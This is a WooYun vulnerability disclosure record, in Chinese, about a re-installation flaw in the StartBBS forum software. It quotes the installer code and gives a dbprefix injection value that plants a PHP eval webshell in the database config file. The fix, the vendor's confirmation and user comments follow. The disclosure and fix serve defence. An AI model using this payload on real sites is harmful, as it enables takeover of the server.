{"id": 5552, "wybug_id": "wooyun-2013-045143", "wybug_title": "开源轻论坛StartBBS前台getshell", "wybug_corp": "www.startbbs.com", "wybug_author": "phith0n", "wybug_date": "2013-12-09 12:11", "wybug_open_date": "2014-03-09 12:11", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["源码审核", "白盒测试"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-12-09：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-12-09：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-12-12：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-02-02：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-02-12：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-02-22：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-03-09：\t细节向公众公开  简要描述： 直接写一句话getshell。所有测试都是在本地进行的哦，我立志做一个好孩纸~！ 详细说明：      心血来潮读读代码。StartBBS界面挺清爽的，体积也小。下载下来安装。　　安装好后发现根目录下多了一个install.lock，一般的cms为了防止被重安装就会在目录下生成一个类似的文件，下次有人再访问安装脚本的时候，脚本会检测，如果目录下有这个文件就提示“请删除后再安装”。　　原本应该是没有任何问题的。但我们来到安装脚本，/app/controllers/install.php中，查看它是怎么处理的：\nclass Install extends Install_Controller{\tfunction __construct ()\t{\t\tparent::__construct();\t\t$this->load->library('myclass');\t\t$file=FCPATH.'install.lock';\t\tif (file_exists($file)){\t\t\t$this->myclass->notice('alert(\"系统已安装过\");window.location.href=\"'.site_url().'\";');\t\t}\t}\n　　看到这里我就笑了。构造函数里检查是否存在install.lock，然后用javascript的方式告诉用户“系统已安装过”，然后跳转。但是这个脚本根本还没有结束嘛，这个类里的函数都可以运行，并不因为返回了一个window.location.href就停止运行。（this->myclass->notice()中也没有停止运行的代码）　　然后，在往下翻，就能看到安装的函数：\npublic function step($step)\t{\t\t$data['step']=$step;\t\tif($step==1 || $step==2){\t\t\t$data['permission'] = $this->_checkFileRight();\t\t\t$this->load->view('install',$data);\t\t}\t\tif($step==3){\t\t\t$this->_install_do();\t\t}\t}\tfunction _install_do()\t{\t\t$data['step']=3;\t\tif($_POST){\t\t\t\t\t$dbhost = $this->input->post('dbhost');\t\t\t\t$dbport = $this->input->post('dbport');\t\t\t\t$dbname = $this->input->post('dbname');\t\t\t\t$dbuser = $this->input->post('dbuser');\t\t\t\t$dbpwd = $this->input->post('dbpwd')?$this->input->post('dbpwd'):'';\t\t\t\t$dbprefix = $this->input->post('dbprefix');\t\t\t\t$userid = $this->input->post('admin');\t\t\t\t$pwd = md5($this->input->post('pwd'));\t\t\t\t$email = $this->input->post('email');\t\t\t\t$sub_folder = '/'.$this->input->post('base_url').'/';\t\t\t\t$conn = mysql_connect($dbhost.':'.$dbport,$dbuser,$dbpwd);\t\t\t\tif (!$conn) {\t\t\t\t\tdie('无法连接到数据库服务器，请检查用户名和密码是否正确');\t\t\t\t}\t\t\t\tif($this->input->post('creatdb')){\t\t\t\t\tif(!@mysql_query('CREATE DATABASE IF NOT EXISTS '.$dbname)){\t\t\t\t\t\tdie('指定的数据库('.$dbname.')系统尝试创建失败，请通过其他方式建立数据库');\t\t\t\t\t}\t\t\t\t}\t\t\t\tif(!mysql_select_db($dbname,$conn)){\t\t\t\t\tdie($dbname.'数据库不存在，请创建或检查数据名.');\t\t\t\t}\t\t\t\t\t$sql = file_get_contents(FCPATH.'app/config/startbbs.sql');\t\t\t\t\t$sql = str_replace(\"sb_\",$dbprefix,$sql);\t\t\t\t\t$explode = explode(\";\",$sql);\t\t\t\t\t$data['msg1']=\"创建表\".$dbname.\"成功，请稍后……<br/>\";\t\t\t\t \tforeach ($explode as $key=>$value){\t\t\t\t    \tif(!empty($value)){\t\t\t\t    \t\tif(trim($value)){\t\t\t\t\t    \t\tmysql_query($value.\";\");\t\t\t\t    \t\t}\t\t\t\t    \t}\t\t\t\t  \t}\t\t\t\t\t$password = $pwd;\t\t\t\t  \t$ip=$this->myclass->get_ip();\t\t\t\t  \t$insert= \"INSERT INTO \".$dbprefix.\"users (group_type,gid,is_active,username,password,email,regtime,ip) VALUES ('0','1','1','\".$userid.\"','\".$password.\"','\".$email.\"','\".time().\"','\".$ip.\"')\";\t\t\t\t  \tmysql_query($insert);\t\t\t\t\tmysql_close($conn);\t\t\t\t\t$data['msg2']=\"安装完成，正在保存配置文件，请稍后……\"; \t\t\t\t\t$dbconfig = \"<?php  if ( ! defined('BASEPATH')) exit('No direct script access allowed');\\n\"\t\t\t\t\t.\"\\$active_group = 'default';\\n\"\t\t\t\t\t.\"\\$active_record = TRUE;\\n\"\t\t\t\t\t.\"\\$db['default']['hostname'] = '\".$dbhost.\"';\\n\"\t\t\t\t\t.\"\\$db['default']['port'] = '\".$dbport.\"';\\n\"\t\t\t\t\t.\"\\$db['default']['username'] = '\".$dbuser.\"';\\n\"\t\t\t\t\t.\"\\$db['default']['password'] = '\".$dbpwd.\"';\\n\"\t\t\t\t\t.\"\\$db['default']['database'] = '\".$dbname.\"';\\n\"\t\t\t\t\t.\"\\$db['default']['dbdriver'] = 'mysql';\\n\"\t\t\t\t\t.\"\\$db['default']['dbprefix'] = '\".$dbprefix.\"';\\n\"\t\t\t\t\t.\"\\$db['default']['pconnect'] = TRUE;\\n\"\t\t\t\t\t.\"\\$db['default']['db_debug'] = TRUE;\\n\"\t\t\t\t\t.\"\\$db['default']['cache_on'] = FALSE;\\n\"\t\t\t\t\t.\"\\$db['default']['cachedir'] = 'app/cache';\\n\"\t\t\t\t\t.\"\\$db['default']['char_set'] = 'utf8';\\n\"\t\t\t\t\t.\"\\$db['default']['dbcollat'] = 'utf8_general_ci';\\n\"\t\t\t\t\t.\"\\$db['default']['swap_pre'] = '';\\n\"\t\t\t\t\t.\"\\$db['default']['autoinit'] = TRUE;\\n\"\t\t\t\t\t.\"\\$db['default']['stricton'] = FALSE;\";\t\t\t\t\t$file = FCPATH.'/app/config/database.php';\t\t\t\t\tfile_put_contents($file,$dbconfig);\t\t\t \t\t\t\t\t//保存config文件\t\t\t\t\tif($sub_folder){\t\t\t\t\t\t$this->config->update('myconfig','sub_folder', $sub_folder);\t\t\t\t\t}\t\t\t\t\t$encryption_key = md5(uniqid());\t\t\t\t\tif($encryption_key){\t\t\t\t\t\t$this->config->update('myconfig','encryption_key', $encryption_key);\t\t\t\t\t}\t\t\t\t\t$data['msg3']=\"保存配置文件完成！\";\t\t\t\t\ttouch(FCPATH.'install.lock'); \t\t\t\t\t$data['msg4']=\"创建锁定安装文件install.lock成功\";\t\t\t\t\t$data['msg5']=\"安装startbbs成功！\";\t\t}\t\t$this->load->view('install',$data);\t}\n　　当step函数的参数为3时，就执行安装函数_install_do()，这个函数里初始化了数据库，并把数据库配置文件写入了“/app/config/database.php”。于是，我们可以构造一下数据包直接把一句话写入到这个配置文件里。　　我们看到，这个函数接收了许多post数据：　　$dbhost = $this->input->post('dbhost');　　$dbport = $this->input->post('dbport');　　$dbname = $this->input->post('dbname');　　$dbuser = $this->input->post('dbuser');　　$dbpwd = $this->input->post('dbpwd')?$this->input->post('dbpwd'):'';　　$dbprefix = $this->input->post('dbprefix');　　$userid = $this->input->post('admin');　　$pwd = md5($this->input->post('pwd'));　　$email = $this->input->post('email');　　$sub_folder = '/'.$this->input->post('base_url').'/';　　其中dbhost、dbport、dbname、dbuser、dbpwd都不能随便乱写，乱写的话安装就会出错，而userid、pwd、email、sub_folder都是写入数据库的，不写入配置文件。所以就剩下dbprefix了，所以我们可以这样构造这个字段：　　dbprefix=sb_';@eval ($_POST[101]);$xxx='   漏洞证明：  因为这个重安装漏洞破坏性太大，getshell以后网站等于重置了，所以我没有在网上测试。测试都在本地进行~首先在外面找一个可以外连的mysql账号，为的是让安装成功进行。我这里在我vps上新建了一个账号test_db_user，然后构造下面的这个数据包，发送：\n\n等待一会发现返回了安装成功提示。因为我在本地测试的，所以我来到网站目录下，/app/config/database.php\n\n可以看到，一句话已经写入了。菜刀连接index.php就可以了，直接连这个数据库配置文件是不行的。\n\n   修复方案：  \nfunction __construct ()\t{\t\tparent::__construct();\t\t$this->load->library('myclass');\t\t$file=FCPATH.'install.lock';\t\tif (file_exists($file)){\t\t\t$this->myclass->notice('alert(\"系统已安装过\");window.location.href=\"'.site_url().'\";');\t\t\texit;\t\t}\t}\n   版权声明：转载请注明来源 phith0n@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2013-12-09 17:41 厂商回复： 谢谢提供的测试，这个漏洞补上。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-12-06 19:14 |    \t\txiaoL \t\t\t( 普通白帽子  |\t\t\t        Rank:361 漏洞数:67        | PKAV技术宅社区!Blog:http://www.xlixli....)\t\t \n  刚用这个奇葩论坛程序建个站你就getshell骚年这么吊是为何...    \n     2013-12-09 18:16 |    \t\tBadCat \t\t\t( 实习白帽子  |\t\t\t        Rank:81 漏洞数:21        | 悲剧的我什么都不会)\t\t \n  呵呵~~厂商认领了呀~~    \n     2013-12-09 21:15 |    \t\tphith0n  \t\t\t( 核心白帽子 |\t\t\t        Rank:656 漏洞数:107        | 一个想当文人的黑客~)\t\t \n  getshell才给10rank……唉    \n     2013-12-10 09:40 |    \t\tBadCat \t\t\t( 实习白帽子  |\t\t\t        Rank:81 漏洞数:21        | 悲剧的我什么都不会)\t\t \n  @phith0n 已经很好了呢~~我一个getshell漏洞都没找到，求指教    \n     2013-12-13 16:19 |    \t\t低调 \t\t\t( 实习白帽子  |\t\t\t        Rank:42 漏洞数:18        | .......)\t\t \n  唉～～骚年 我刚弄了个论坛  你就发这个我就 果断的删了  安装个别的吧  唉～～～    \n     2013-12-13 21:03 |    \t\tphith0n  \t\t\t( 核心白帽子 |\t\t\t        Rank:656 漏洞数:107        | 一个想当文人的黑客~)\t\t \n  @低调 官方应该已经修了~    \n     2014-01-03 15:15 |    \t\txiaoL \t\t\t( 普通白帽子  |\t\t\t        Rank:361 漏洞数:67        | PKAV技术宅社区!Blog:http://www.xlixli....)\t\t \n  危害说大也大说小也小...这个洞需要得到数据库的用户名和密码才能触发    \n     2014-01-03 18:39 |    \t\tphith0n  \t\t\t( 核心白帽子 |\t\t\t        Rank:656 漏洞数:107        | 一个想当文人的黑客~)\t\t \n  @xiaoL 外连数据库就可以了，只要能成功连上任何一个数据库就能getshell    \n     2015-01-18 23:55 |    \t\t路飞 \t\t\t( 普通白帽子  |\t\t\t        Rank:112 漏洞数:21        | 上帝恩赐，命运天定。希望之光，普照我身。...)\t\t \n  @phith0n 直接连这个数据库配置文件是不行的。 为什么不行的？    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 10, "Ranks": null}